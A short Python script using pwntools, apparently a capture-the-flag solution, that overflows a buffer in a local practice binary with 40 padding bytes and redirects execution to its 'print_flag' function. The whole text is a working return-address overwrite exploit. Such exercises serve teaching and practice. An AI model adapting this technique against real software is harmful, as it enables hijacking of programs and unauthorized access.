from pwn import*
proc=ELF('./hi')
target_address=p64(proc.symbols['print_flag'])
garbage=b'A'*40
msgin=garbage+target_address
p=process('./hi')
p.sendline(msgin)
msgout=p.recvall()
print(msgout)
